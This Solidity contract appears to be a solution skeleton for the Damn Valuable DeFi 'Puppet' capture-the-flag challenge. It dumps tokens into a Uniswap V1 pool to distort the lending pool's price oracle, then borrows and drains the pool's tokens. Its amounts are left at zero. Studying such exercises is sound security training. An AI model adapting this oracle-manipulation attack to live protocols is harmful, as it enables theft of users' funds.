// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient)
        external
        returns (uint256);
}

contract AttackPuppet {
    address immutable exchange;
    DamnValuableToken immutable token;
    PuppetPool immutable pool;
    address immutable player;

    constructor(address _token, address _pool, address uniswapPairAddress) {
        token = DamnValuableToken(_token);
        exchange = uniswapPairAddress;
        pool = PuppetPool(_pool);
        player = msg.sender;
    }

    function attack() external payable {
        uint256 borrow = 0;
        uint256 sell = 0;

        // Dump DVT to the Uniswap Pool
        token.approve(address(exchange), sell);
        IUniswapExchangeV1(exchange).tokenToEthTransferInput(sell, 9, block.timestamp, address(this));

        // Calculate required collateral
        uint256 price = address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));
        uint256 depositRequired = borrow * price * pool.DEPOSIT_FACTOR() / 10 ** 18;

        // Borrow and steal the DVT
        pool.borrow{value: depositRequired}(borrow, player);
    }

    receive() external payable {}
}
